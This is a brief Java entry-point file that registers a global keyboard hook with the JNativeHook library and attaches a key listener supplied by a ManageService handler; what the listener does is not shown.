package main;

import handlers.ManageService;
import org.jnativehook.GlobalScreen;

public class Main {

    public static void main(String[] args) {
        ManageService service = new ManageService();

        try {
            GlobalScreen.registerNativeHook();
        } catch (Throwable e) {
            e.printStackTrace();
        }

        GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
    }
}